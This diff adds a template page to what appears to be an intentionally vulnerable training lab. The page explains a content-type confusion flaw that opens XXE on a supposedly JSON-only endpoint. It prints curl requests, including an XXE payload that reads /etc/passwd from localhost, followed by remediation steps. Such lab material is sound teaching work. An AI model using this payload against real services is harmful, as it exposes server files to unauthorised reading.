@@ -1,0 +1,37 @@
+{% extends 'base.html' %}
+{% block title %}Content-Type Confusion → XXE{% endblock %}
+{% block content %}
+<div class="panel">
+  <div class="panel-head">
+    <span class="badge p2">P2</span>
+    <h2>Content-Type Confusion → XML XXE</h2>
+    <p class="mono-dim">CWE-436 + CWE-611 · JSON endpoint silently processes XML · XXE enabled on XML branch</p>
+  </div>
+  <div class="vuln-info">
+    This endpoint is documented as JSON-only. But the server dispatches on the actual
+    <code>Content-Type</code> header — not a fixed expectation — and the XML branch uses
+    <code>lxml</code> with <code>resolve_entities=True</code>. Switching the Content-Type
+    opens XXE on a route that appears safe in code review.
+  </div>
+  <div class="hint-box">
+    <b>Step 1 — Normal JSON request:</b>
+    <pre class="result-block">curl -X POST http://localhost:5000/telemetry/data-feed \
+  -H "Content-Type: application/json" \
+  -H "Cookie: session=&lt;your-cookie&gt;" \
+  -d '{"sensor_id":"T-01","value":42}'</pre>
+    <b>Step 2 — Switch to XML + inject XXE:</b>
+    <pre class="result-block">curl -X POST http://localhost:5000/telemetry/data-feed \
+  -H "Content-Type: application/xml" \
+  -H "Cookie: session=&lt;your-cookie&gt;" \
+  -d '&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+&lt;telemetry&gt;
+  &lt;sensor_id&gt;T-01&lt;/sensor_id&gt;
+  &lt;value&gt;&amp;xxe;&lt;/value&gt;
+&lt;/telemetry&gt;'</pre>
+    The <code>&lt;value&gt;</code> field in the response will contain <code>/etc/passwd</code>.
+    <br><b>Remediation:</b> Accept only <code>application/json</code>; reject all other Content-Types at the route level.
+    If XML must be supported, use <code>defusedxml</code> or <code>lxml</code> with <code>resolve_entities=False</code>.
+  </div>
+</div>
+{% endblock %}
